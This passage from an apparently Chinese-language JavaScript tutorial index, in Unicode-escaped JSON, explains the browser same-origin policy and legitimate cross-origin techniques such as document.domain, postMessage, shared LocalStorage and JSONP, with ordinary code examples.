\u4e0b\u9762\u662f\u6839\u636e\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff0c\u5c06\u7528\u6237\u5bfc\u5411\u4e0d\u540c\u7f51\u9875\u7684\u4ee3\u7801\u3002 1 2 3 4 5 if (( screen . width <= 800 ) && ( screen . height <= 600 )) { window . location . replace ( 'small.html' ); } else { window . location . replace ( 'wide.html' ); }","title":"Screen \u5bf9\u8c61"},{"location":"bom/same-origin/","text":"\u540c\u6e90\u9650\u5236 \u00b6 \u6d4f\u89c8\u5668\u5b89\u5168\u7684\u57fa\u77f3\u662f\u201c\u540c\u6e90\u653f\u7b56\u201d\uff08 same-origin policy \uff09\u3002\u5f88\u591a\u5f00\u53d1\u8005\u90fd\u77e5\u9053\u8fd9\u4e00\u70b9\uff0c\u4f46\u4e86\u89e3\u5f97\u4e0d\u5168\u9762\u3002 \u6982\u8ff0 \u00b6 \u542b\u4e49 \u00b6 1995\u5e74\uff0c\u540c\u6e90\u653f\u7b56\u7531 Netscape \u516c\u53f8\u5f15\u5165\u6d4f\u89c8\u5668\u3002\u76ee\u524d\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u5b9e\u884c\u8fd9\u4e2a\u653f\u7b56\u3002 \u6700\u521d\uff0c\u5b83\u7684\u542b\u4e49\u662f\u6307\uff0cA \u7f51\u9875\u8bbe\u7f6e\u7684 Cookie\uff0cB \u7f51\u9875\u4e0d\u80fd\u6253\u5f00\uff0c\u9664\u975e\u8fd9\u4e24\u4e2a\u7f51\u9875\u201c\u540c\u6e90\u201d\u3002\u6240\u8c13\u201c\u540c\u6e90\u201d\u6307\u7684\u662f\u201c\u4e09\u4e2a\u76f8\u540c\u201d\u3002 \u534f\u8bae\u76f8\u540c \u57df\u540d\u76f8\u540c \u7aef\u53e3\u76f8\u540c\uff08\u8fd9\u70b9\u53ef\u4ee5\u5ffd\u7565\uff0c\u8be6\u89c1\u4e0b\u6587\uff09 \u4e3e\u4f8b\u6765\u8bf4\uff0c http://www.example.com/dir/page.html \u8fd9\u4e2a\u7f51\u5740\uff0c\u534f\u8bae\u662f http:// \uff0c\u57df\u540d\u662f www.example.com \uff0c\u7aef\u53e3\u662f 80 \uff08\u9ed8\u8ba4\u7aef\u53e3\u53ef\u4ee5\u7701\u7565\uff09\uff0c\u5b83\u7684\u540c\u6e90\u60c5\u51b5\u5982\u4e0b\u3002 http://www.example.com/dir2/other.html \uff1a\u540c\u6e90 http://example.com/dir/other.html \uff1a\u4e0d\u540c\u6e90\uff08\u57df\u540d\u4e0d\u540c\uff09 http://v2.www.example.com/dir/other.html \uff1a\u4e0d\u540c\u6e90\uff08\u57df\u540d\u4e0d\u540c\uff09 http://www.example.com:81/dir/other.html \uff1a\u4e0d\u540c\u6e90\uff08\u7aef\u53e3\u4e0d\u540c\uff09 https://www.example.com/dir/page.html \uff1a\u4e0d\u540c\u6e90\uff08\u534f\u8bae\u4e0d\u540c\uff09 \u6ce8\u610f\uff0c\u6807\u51c6\u89c4\u5b9a\u7aef\u53e3\u4e0d\u540c\u7684\u7f51\u5740\u4e0d\u662f\u540c\u6e90\uff08\u6bd4\u59828000\u7aef\u53e3\u548c8001\u7aef\u53e3\u4e0d\u662f\u540c\u6e90\uff09\uff0c\u4f46\u662f\u6d4f\u89c8\u5668\u6ca1\u6709\u9075\u5b88\u8fd9\u6761\u89c4\u5b9a\u3002\u5b9e\u9645\u4e0a\uff0c\u540c\u4e00\u4e2a\u7f51\u57df\u7684\u4e0d\u540c\u7aef\u53e3\uff0c\u662f\u53ef\u4ee5\u4e92\u76f8\u8bfb\u53d6 Cookie \u7684\u3002 \u76ee\u7684 \u00b6 \u540c\u6e90\u653f\u7b56\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7528\u6237\u4fe1\u606f\u7684\u5b89\u5168\uff0c\u9632\u6b62\u6076\u610f\u7684\u7f51\u7ad9\u7a83\u53d6\u6570\u636e\u3002 \u8bbe\u60f3\u8fd9\u6837\u4e00\u79cd\u60c5\u51b5\uff1aA \u7f51\u7ad9\u662f\u4e00\u5bb6\u94f6\u884c\uff0c\u7528\u6237\u767b\u5f55\u4ee5\u540e\uff0cA \u7f51\u7ad9\u5728\u7528\u6237\u7684\u673a\u5668\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a Cookie\uff0c\u5305\u542b\u4e86\u4e00\u4e9b\u9690\u79c1\u4fe1\u606f\u3002\u7528\u6237\u79bb\u5f00 A \u7f51\u7ad9\u4ee5\u540e\uff0c\u53c8\u53bb\u8bbf\u95ee B \u7f51\u7ad9\uff0c\u5982\u679c\u6ca1\u6709\u540c\u6e90\u9650\u5236\uff0cB \u7f51\u7ad9\u53ef\u4ee5\u8bfb\u53d6 A \u7f51\u7ad9\u7684 Cookie\uff0c\u90a3\u4e48\u9690\u79c1\u5c31\u6cc4\u6f0f\u4e86\u3002\u66f4\u53ef\u6015\u7684\u662f\uff0cCookie \u5f80\u5f80\u7528\u6765\u4fdd\u5b58\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\uff0c\u5982\u679c\u7528\u6237\u6ca1\u6709\u9000\u51fa\u767b\u5f55\uff0c\u5176\u4ed6\u7f51\u7ad9\u5c31\u53ef\u4ee5\u5192\u5145\u7528\u6237\uff0c\u4e3a\u6240\u6b32\u4e3a\u3002\u56e0\u4e3a\u6d4f\u89c8\u5668\u540c\u65f6\u8fd8\u89c4\u5b9a\uff0c\u63d0\u4ea4\u8868\u5355\u4e0d\u53d7\u540c\u6e90\u653f\u7b56\u7684\u9650\u5236\u3002 \u7531\u6b64\u53ef\u89c1\uff0c\u540c\u6e90\u653f\u7b56\u662f\u5fc5\u9700\u7684\uff0c\u5426\u5219 Cookie \u53ef\u4ee5\u5171\u4eab\uff0c\u4e92\u8054\u7f51\u5c31\u6beb\u65e0\u5b89\u5168\u53ef\u8a00\u4e86\u3002 \u9650\u5236\u8303\u56f4 \u00b6 \u968f\u7740\u4e92\u8054\u7f51\u7684\u53d1\u5c55\uff0c\u540c\u6e90\u653f\u7b56\u8d8a\u6765\u8d8a\u4e25\u683c\u3002\u76ee\u524d\uff0c\u5982\u679c\u975e\u540c\u6e90\uff0c\u5171\u6709\u4e09\u79cd\u884c\u4e3a\u53d7\u5230\u9650\u5236\u3002 \uff081\uff09 \u65e0\u6cd5\u8bfb\u53d6\u975e\u540c\u6e90\u7f51\u9875\u7684 Cookie\u3001LocalStorage \u548c IndexedDB\u3002 \uff082\uff09 \u65e0\u6cd5\u63a5\u89e6\u975e\u540c\u6e90\u7f51\u9875\u7684 DOM\u3002 \uff083\uff09 \u65e0\u6cd5\u5411\u975e\u540c\u6e90\u5730\u5740\u53d1\u9001 AJAX \u8bf7\u6c42\uff08\u53ef\u4ee5\u53d1\u9001\uff0c\u4f46\u6d4f\u89c8\u5668\u4f1a\u62d2\u7edd\u63a5\u53d7\u54cd\u5e94\uff09\u3002 \u53e6\u5916\uff0c\u901a\u8fc7 JavaScript \u811a\u672c\u53ef\u4ee5\u62ff\u5230\u5176\u4ed6\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002\u5982\u679c\u662f\u975e\u540c\u6e90\u7684\u7f51\u9875\uff0c\u76ee\u524d\u5141\u8bb8\u4e00\u4e2a\u7a97\u53e3\u53ef\u4ee5\u63a5\u89e6\u5176\u4ed6\u7f51\u9875\u7684 window \u5bf9\u8c61\u7684\u4e5d\u4e2a\u5c5e\u6027\u548c\u56db\u4e2a\u65b9\u6cd5\u3002 window.closed window.frames window.length window.location window.opener window.parent window.self window.top window.window window.blur() window.close() window.focus() window.postMessage() \u4e0a\u9762\u7684\u4e5d\u4e2a\u5c5e\u6027\u4e4b\u4e2d\uff0c\u53ea\u6709 window.location \u662f\u53ef\u8bfb\u5199\u7684\uff0c\u5176\u4ed6\u516b\u4e2a\u5168\u90e8\u90fd\u662f\u53ea\u8bfb\u3002\u800c\u4e14\uff0c\u5373\u4f7f\u662f location \u5bf9\u8c61\uff0c\u975e\u540c\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u53ea\u5141\u8bb8\u8c03\u7528 location.replace() \u65b9\u6cd5\u548c\u5199\u5165 location.href \u5c5e\u6027\u3002 \u867d\u7136\u8fd9\u4e9b\u9650\u5236\u662f\u5fc5\u8981\u7684\uff0c\u4f46\u662f\u6709\u65f6\u5f88\u4e0d\u65b9\u4fbf\uff0c\u5408\u7406\u7684\u7528\u9014\u4e5f\u53d7\u5230\u5f71\u54cd\u3002\u4e0b\u9762\u4ecb\u7ecd\u5982\u4f55\u89c4\u907f\u4e0a\u9762\u7684\u9650\u5236\u3002 Cookie \u00b6 Cookie \u662f\u670d\u52a1\u5668\u5199\u5165\u6d4f\u89c8\u5668\u7684\u4e00\u5c0f\u6bb5\u4fe1\u606f\uff0c\u53ea\u6709\u540c\u6e90\u7684\u7f51\u9875\u624d\u80fd\u5171\u4eab\u3002\u5982\u679c\u4e24\u4e2a\u7f51\u9875\u4e00\u7ea7\u57df\u540d\u76f8\u540c\uff0c\u53ea\u662f\u6b21\u7ea7\u57df\u540d\u4e0d\u540c\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u901a\u8fc7\u8bbe\u7f6e document.domain \u5171\u4eab Cookie\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0cA \u7f51\u9875\u7684\u7f51\u5740\u662f http://w1.example.com/a.html \uff0cB \u7f51\u9875\u7684\u7f51\u5740\u662f http://w2.example.com/b.html \uff0c\u90a3\u4e48\u53ea\u8981\u8bbe\u7f6e\u76f8\u540c\u7684 document.domain \uff0c\u4e24\u4e2a\u7f51\u9875\u5c31\u53ef\u4ee5\u5171\u4eab Cookie\u3002\u56e0\u4e3a\u6d4f\u89c8\u5668\u901a\u8fc7 document.domain \u5c5e\u6027\u6765\u68c0\u67e5\u662f\u5426\u540c\u6e90\u3002 1 2 // \u4e24\u4e2a\u7f51\u9875\u90fd\u9700\u8981\u8bbe\u7f6e document . domain = 'example.com' ; \u6ce8\u610f\uff0cA \u548c B \u4e24\u4e2a\u7f51\u9875\u90fd\u9700\u8981\u8bbe\u7f6e document.domain \u5c5e\u6027\uff0c\u624d\u80fd\u8fbe\u5230\u540c\u6e90\u7684\u76ee\u7684\u3002\u56e0\u4e3a\u8bbe\u7f6e document.domain \u7684\u540c\u65f6\uff0c\u4f1a\u628a\u7aef\u53e3\u91cd\u7f6e\u4e3a null \uff0c\u56e0\u6b64\u5982\u679c\u53ea\u8bbe\u7f6e\u4e00\u4e2a\u7f51\u9875\u7684 document.domain \uff0c\u4f1a\u5bfc\u81f4\u4e24\u4e2a\u7f51\u5740\u7684\u7aef\u53e3\u4e0d\u540c\uff0c\u8fd8\u662f\u8fbe\u4e0d\u5230\u540c\u6e90\u7684\u76ee\u7684\u3002 \u73b0\u5728\uff0cA \u7f51\u9875\u901a\u8fc7\u811a\u672c\u8bbe\u7f6e\u4e00\u4e2a Cookie\u3002 1 document . cookie = \"test1=hello\" ; B \u7f51\u9875\u5c31\u53ef\u4ee5\u8bfb\u5230\u8fd9\u4e2a Cookie\u3002 1 var allCookie = document . cookie ; \u6ce8\u610f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u53ea\u9002\u7528\u4e8e Cookie \u548c iframe \u7a97\u53e3\uff0cLocalStorage \u548c IndexedDB \u65e0\u6cd5\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u89c4\u907f\u540c\u6e90\u653f\u7b56\uff0c\u800c\u8981\u4f7f\u7528\u4e0b\u6587\u4ecb\u7ecd PostMessage API\u3002 \u53e6\u5916\uff0c\u670d\u52a1\u5668\u4e5f\u53ef\u4ee5\u5728\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff0c\u6307\u5b9a Cookie \u7684\u6240\u5c5e\u57df\u540d\u4e3a\u4e00\u7ea7\u57df\u540d\uff0c\u6bd4\u5982 example.com \u3002 1 Set-Cookie: key=value; domain=example.com; path=/ \u8fd9\u6837\u7684\u8bdd\uff0c\u4e8c\u7ea7\u57df\u540d\u548c\u4e09\u7ea7\u57df\u540d\u4e0d\u7528\u505a\u4efb\u4f55\u8bbe\u7f6e\uff0c\u90fd\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e2a Cookie\u3002 iframe \u548c\u591a\u7a97\u53e3\u901a\u4fe1 \u00b6 iframe \u5143\u7d20\u53ef\u4ee5\u5728\u5f53\u524d\u7f51\u9875\u4e4b\u4e2d\uff0c\u5d4c\u5165\u5176\u4ed6\u7f51\u9875\u3002\u6bcf\u4e2a iframe \u5143\u7d20\u5f62\u6210\u81ea\u5df1\u7684\u7a97\u53e3\uff0c\u5373\u6709\u81ea\u5df1\u7684 window \u5bf9\u8c61\u3002 iframe \u7a97\u53e3\u4e4b\u4e2d\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u83b7\u5f97\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u3002\u4f46\u662f\uff0c\u53ea\u6709\u5728\u540c\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u624d\u80fd\u901a\u4fe1\uff1b\u5982\u679c\u8de8\u57df\uff0c\u5c31\u65e0\u6cd5\u62ff\u5230\u5bf9\u65b9\u7684 DOM\u3002 \u6bd4\u5982\uff0c\u7236\u7a97\u53e3\u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5982\u679c iframe \u7a97\u53e3\u4e0d\u662f\u540c\u6e90\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 document . getElementById ( \"myIFrame\" ) . contentWindow . document // Uncaught DOMException: Blocked a frame from accessing a cross-origin frame. \u4e0a\u9762\u547d\u4ee4\u4e2d\uff0c\u7236\u7a97\u53e3\u60f3\u83b7\u53d6\u5b50\u7a97\u53e3\u7684 DOM\uff0c\u56e0\u4e3a\u8de8\u57df\u5bfc\u81f4\u62a5\u9519\u3002 \u53cd\u4e4b\u4ea6\u7136\uff0c\u5b50\u7a97\u53e3\u83b7\u53d6\u4e3b\u7a97\u53e3\u7684 DOM \u4e5f\u4f1a\u62a5\u9519\u3002 1 2 window . parent . document . body // \u62a5\u9519 \u8fd9\u79cd\u60c5\u51b5\u4e0d\u4ec5\u9002\u7528\u4e8e iframe \u7a97\u53e3\uff0c\u8fd8\u9002\u7528\u4e8e window.open \u65b9\u6cd5\u6253\u5f00\u7684\u7a97\u53e3\uff0c\u53ea\u8981\u8de8\u57df\uff0c\u7236\u7a97\u53e3\u4e0e\u5b50\u7a97\u53e3\u4e4b\u95f4\u5c31\u65e0\u6cd5\u901a\u4fe1\u3002 \u5982\u679c\u4e24\u4e2a\u7a97\u53e3\u4e00\u7ea7\u57df\u540d\u76f8\u540c\uff0c\u53ea\u662f\u4e8c\u7ea7\u57df\u540d\u4e0d\u540c\uff0c\u90a3\u4e48\u8bbe\u7f6e\u4e0a\u4e00\u8282\u4ecb\u7ecd\u7684 document.domain \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u89c4\u907f\u540c\u6e90\u653f\u7b56\uff0c\u62ff\u5230 DOM\u3002 \u5bf9\u4e8e\u5b8c\u5168\u4e0d\u540c\u6e90\u7684\u7f51\u7ad9\uff0c\u76ee\u524d\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u89e3\u51b3\u8de8\u57df\u7a97\u53e3\u7684\u901a\u4fe1\u95ee\u9898\u3002 \u7247\u6bb5\u8bc6\u522b\u7b26\uff08fragment identifier\uff09 \u8de8\u6587\u6863\u901a\u4fe1API\uff08Cross-document messaging\uff09 \u7247\u6bb5\u8bc6\u522b\u7b26 \u00b6 \u7247\u6bb5\u6807\u8bc6\u7b26\uff08fragment identifier\uff09\u6307\u7684\u662f\uff0cURL \u7684 # \u53f7\u540e\u9762\u7684\u90e8\u5206\uff0c\u6bd4\u5982 http://example.com/x.html#fragment \u7684 #fragment \u3002\u5982\u679c\u53ea\u662f\u6539\u53d8\u7247\u6bb5\u6807\u8bc6\u7b26\uff0c\u9875\u9762\u4e0d\u4f1a\u91cd\u65b0\u5237\u65b0\u3002 \u7236\u7a97\u53e3\u53ef\u4ee5\u628a\u4fe1\u606f\uff0c\u5199\u5165\u5b50\u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002 1 2 var src = originURL + '#' + data ; document . getElementById ( 'myIFrame' ). src = src ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7236\u7a97\u53e3\u628a\u6240\u8981\u4f20\u9012\u7684\u4fe1\u606f\uff0c\u5199\u5165 iframe \u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002 \u5b50\u7a97\u53e3\u901a\u8fc7\u76d1\u542c hashchange \u4e8b\u4ef6\u5f97\u5230\u901a\u77e5\u3002 1 2 3 4 5 6 window . onhashchange = checkMessage ; function checkMessage () { var message = window . location . hash ; // ... } \u540c\u6837\u7684\uff0c\u5b50\u7a97\u53e3\u4e5f\u53ef\u4ee5\u6539\u53d8\u7236\u7a97\u53e3\u7684\u7247\u6bb5\u6807\u8bc6\u7b26\u3002 1 parent . location . href = target + '#' + hash ; window.postMessage() \u00b6 \u4e0a\u9762\u7684\u8fd9\u79cd\u65b9\u6cd5\u5c5e\u4e8e\u7834\u89e3\uff0cHTML5 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f15\u5165\u4e86\u4e00\u4e2a\u5168\u65b0\u7684API\uff1a\u8de8\u6587\u6863\u901a\u4fe1 API\uff08Cross-document messaging\uff09\u3002 \u8fd9\u4e2a API \u4e3a window \u5bf9\u8c61\u65b0\u589e\u4e86\u4e00\u4e2a window.postMessage \u65b9\u6cd5\uff0c\u5141\u8bb8\u8de8\u7a97\u53e3\u901a\u4fe1\uff0c\u4e0d\u8bba\u8fd9\u4e24\u4e2a\u7a97\u53e3\u662f\u5426\u540c\u6e90\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7236\u7a97\u53e3 aaa.com \u5411\u5b50\u7a97\u53e3 bbb.com \u53d1\u6d88\u606f\uff0c\u8c03\u7528 postMessage \u65b9\u6cd5\u5c31\u53ef\u4ee5\u4e86\u3002 1 2 3 4 // \u7236\u7a97\u53e3\u6253\u5f00\u4e00\u4e2a\u5b50\u7a97\u53e3 var popup = window . open ( 'http://bbb.com' , 'title' ); // \u7236\u7a97\u53e3\u5411\u5b50\u7a97\u53e3\u53d1\u6d88\u606f popup . postMessage ( 'Hello World!' , 'http://bbb.com' ); postMessage \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5177\u4f53\u7684\u4fe1\u606f\u5185\u5bb9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u63a5\u6536\u6d88\u606f\u7684\u7a97\u53e3\u7684\u6e90\uff08origin\uff09\uff0c\u5373\u201c\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\u201d\u3002\u4e5f\u53ef\u4ee5\u8bbe\u4e3a * \uff0c\u8868\u793a\u4e0d\u9650\u5236\u57df\u540d\uff0c\u5411\u6240\u6709\u7a97\u53e3\u53d1\u9001\u3002 \u5b50\u7a97\u53e3\u5411\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u7684\u5199\u6cd5\u7c7b\u4f3c\u3002 1 2 // \u5b50\u7a97\u53e3\u5411\u7236\u7a97\u53e3\u53d1\u6d88\u606f window . opener . postMessage ( 'Nice to see you' , 'http://aaa.com' ); \u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u90fd\u53ef\u4ee5\u901a\u8fc7 message \u4e8b\u4ef6\uff0c\u76d1\u542c\u5bf9\u65b9\u7684\u6d88\u606f\u3002 1 2 3 4 5 // \u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u90fd\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\uff0c // \u76d1\u542c message \u6d88\u606f window . addEventListener ( 'message' , function ( e ) { console . log ( e . data ); }, false ); message \u4e8b\u4ef6\u7684\u53c2\u6570\u662f\u4e8b\u4ef6\u5bf9\u8c61 event \uff0c\u63d0\u4f9b\u4ee5\u4e0b\u4e09\u4e2a\u5c5e\u6027\u3002 event.source \uff1a\u53d1\u9001\u6d88\u606f\u7684\u7a97\u53e3 event.origin : \u6d88\u606f\u53d1\u5411\u7684\u7f51\u5740 event.data : \u6d88\u606f\u5185\u5bb9 \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\uff0c\u5b50\u7a97\u53e3\u901a\u8fc7 event.source \u5c5e\u6027\u5f15\u7528\u7236\u7a97\u53e3\uff0c\u7136\u540e\u53d1\u9001\u6d88\u606f\u3002 1 2 3 4 window . addEventListener ( 'message' , receiveMessage ); function receiveMessage ( event ) { event . source . postMessage ( 'Nice to see you!' , '*' ); } \u4e0a\u9762\u4ee3\u7801\u6709\u51e0\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u9996\u5148\uff0c receiveMessage \u51fd\u6570\u91cc\u9762\u6ca1\u6709\u8fc7\u6ee4\u4fe1\u606f\u7684\u6765\u6e90\uff0c\u4efb\u610f\u7f51\u5740\u53d1\u6765\u7684\u4fe1\u606f\u90fd\u4f1a\u88ab\u5904\u7406\u3002\u5176\u6b21\uff0c postMessage \u65b9\u6cd5\u4e2d\u6307\u5b9a\u7684\u76ee\u6807\u7a97\u53e3\u7684\u7f51\u5740\u662f\u4e00\u4e2a\u661f\u53f7\uff0c\u8868\u793a\u8be5\u4fe1\u606f\u53ef\u4ee5\u5411\u4efb\u610f\u7f51\u5740\u53d1\u9001\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u505a\u6cd5\u662f\u4e0d\u63a8\u8350\u7684\uff0c\u56e0\u4e3a\u4e0d\u591f\u5b89\u5168\uff0c\u53ef\u80fd\u4f1a\u88ab\u6076\u610f\u5229\u7528\u3002 event.origin \u5c5e\u6027\u53ef\u4ee5\u8fc7\u6ee4\u4e0d\u662f\u53d1\u7ed9\u672c\u7a97\u53e3\u7684\u6d88\u606f\u3002 1 2 3 4 5 6 7 8 9 window . addEventListener ( 'message' , receiveMessage ); function receiveMessage ( event ) { if ( event . origin !== 'http://aaa.com' ) return ; if ( event . data === 'Hello World' ) { event . source . postMessage ( 'Hello' , event . origin ); } else { console . log ( event . data ); } } LocalStorage \u00b6 \u901a\u8fc7 window.postMessage \uff0c\u8bfb\u5199\u5176\u4ed6\u7a97\u53e3\u7684 LocalStorage \u4e5f\u6210\u4e3a\u4e86\u53ef\u80fd\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4e3b\u7a97\u53e3\u5199\u5165 iframe \u5b50\u7a97\u53e3\u7684 localStorage \u3002 1 2 3 4 5 6 7 window . onmessage = function ( e ) { if ( e . origin !== 'http://bbb.com' ) { return ; } var payload = JSON . parse ( e . data ); localStorage . setItem ( payload . key , JSON . stringify ( payload . data )); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7a97\u53e3\u5c06\u7236\u7a97\u53e3\u53d1\u6765\u7684\u6d88\u606f\uff0c\u5199\u5165\u81ea\u5df1\u7684 LocalStorage\u3002 \u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u7684\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 var win = document . getElementsByTagName ( 'iframe' )[ 0 ]. contentWindow ; var obj = { name : 'Jack' }; win . postMessage ( JSON . stringify ({ key : 'storage' , data : obj }), 'http://bbb.com' ); \u52a0\u5f3a\u7248\u7684\u5b50\u7a97\u53e3\u63a5\u6536\u6d88\u606f\u7684\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 window . onmessage = function ( e ) { if ( e . origin !== 'http://bbb.com' ) return ; var payload = JSON . parse ( e . data ); switch ( payload . method ) { case 'set' : localStorage . setItem ( payload . key , JSON . stringify ( payload . data )); break ; case 'get' : var parent = window . parent ; var data = localStorage . getItem ( payload . key ); parent . postMessage ( data , 'http://aaa.com' ); break ; case 'remove' : localStorage . removeItem ( payload . key ); break ; } }; \u52a0\u5f3a\u7248\u7684\u7236\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var win = document . getElementsByTagName ( 'iframe' )[ 0 ]. contentWindow ; var obj = { name : 'Jack' }; // \u5b58\u5165\u5bf9\u8c61 win . postMessage ( JSON . stringify ({ key : 'storage' , method : 'set' , data : obj }), 'http://bbb.com' ); // \u8bfb\u53d6\u5bf9\u8c61 win . postMessage ( JSON . stringify ({ key : 'storage' , method : \"get\" }), \"*\" ); window . onmessage = function ( e ) { if ( e . origin != 'http://aaa.com' ) return ; console . log ( JSON . parse ( e . data ). name ); }; AJAX \u00b6 \u540c\u6e90\u653f\u7b56\u89c4\u5b9a\uff0cAJAX \u8bf7\u6c42\u53ea\u80fd\u53d1\u7ed9\u540c\u6e90\u7684\u7f51\u5740\uff0c\u5426\u5219\u5c31\u62a5\u9519\u3002 \u9664\u4e86\u67b6\u8bbe\u670d\u52a1\u5668\u4ee3\u7406\uff08\u6d4f\u89c8\u5668\u8bf7\u6c42\u540c\u6e90\u670d\u52a1\u5668\uff0c\u518d\u7531\u540e\u8005\u8bf7\u6c42\u5916\u90e8\u670d\u52a1\uff09\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u89c4\u907f\u8fd9\u4e2a\u9650\u5236\u3002 JSONP WebSocket CORS JSONP \u00b6 JSONP \u662f\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u8de8\u6e90\u901a\u4fe1\u7684\u5e38\u7528\u65b9\u6cd5\u3002\u6700\u5927\u7279\u70b9\u5c31\u662f\u7b80\u5355\u6613\u7528\uff0c\u6ca1\u6709\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u8001\u5f0f\u6d4f\u89c8\u5668\u5168\u90e8\u652f\u6301\uff0c\u670d\u52a1\u7aef\u6539\u9020\u975e\u5e38\u5c0f\u3002 \u5b83\u7684\u505a\u6cd5\u5982\u4e0b\u3002 \u7b2c\u4e00\u6b65\uff0c\u7f51\u9875\u6dfb\u52a0\u4e00\u4e2a <script> \u5143\u7d20\uff0c\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u4e00\u4e2a\u811a\u672c\uff0c\u8fd9\u4e0d\u53d7\u540c\u6e90\u653f\u7b56\u9650\u5236\uff0c\u53ef\u4ee5\u8de8\u57df\u8bf7\u6c42\u3002 1 < script src = \"http://api.foo.com?callback=bar\" ></ script > \u6ce8\u610f\uff0c\u8bf7\u6c42\u7684\u811a\u672c\u7f51\u5740\u6709\u4e00\u4e2a callback \u53c2\u6570\uff08 ?callback=bar \uff09\uff0c\u7528\u6765\u544a\u8bc9\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u7684\u56de\u8c03\u51fd\u6570\u540d\u79f0\uff08 bar \uff09\u3002 \u7b2c\u4e8c\u6b65\uff0c\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u62fc\u63a5\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c06 JSON \u6570\u636e\u653e\u5728\u51fd\u6570\u540d\u91cc\u9762\uff0c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fd4\u56de\uff08 bar({...}) \uff09\u3002 \u7b2c\u4e09\u6b65\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\uff0c\u4f5c\u4e3a\u4ee3\u7801\u89e3\u6790\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u8ba4\u4e3a\uff0c\u8fd9\u662f <script> \u6807\u7b7e\u8bf7\u6c42\u7684\u811a\u672c\u5185\u5bb9\u3002\u8fd9\u65f6\uff0c\u5ba2\u6237\u7aef\u53ea\u8981\u5b9a\u4e49\u4e86 bar() \u51fd\u6570\uff0c\u5c31\u80fd\u5728\u8be5\u51fd\u6570\u4f53\u5185\uff0c\u62ff\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684 JSON \u6570\u636e\u3002 \u4e0b\u9762\u770b\u4e00\u4e2a\u5b9e\u4f8b\u3002\u9996\u5148\uff0c\u7f51\u9875\u52a8\u6001\u63d2\u5165 <script> \u5143\u7d20\uff0c\u7531\u5b83\u5411\u8de8\u57df\u7f51\u5740\u53d1\u51fa\u8bf7\u6c42\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function addScriptTag ( src ) { var script = document . createElement ( 'script' ); script . setAttribute ( 'type' , 'text/javascript' ); script . src = src ; document . body . appendChild ( script ); } window . onload = function () { addScriptTag ( 'http://example.com/ip?callback=foo' ); } function foo ( data ) { console . log ( 'Your public IP address is: ' + data . ip ); }; \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u52a8\u6001\u6dfb\u52a0 <script> \u5143\u7d20\uff0c\u5411\u670d\u52a1\u5668 example.com \u53d1\u51fa\u8bf7\u6c42\u3002\u6ce8\u610f\uff0c\u8be5\u8bf7\u6c42\u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e00\u4e2a callback \u53c2\u6570\uff0c\u7528\u6765\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u7684\u540d\u5b57\uff0c\u8fd9\u5bf9\u4e8e JSONP \u662f\u5fc5\u9700\u7684\u3002 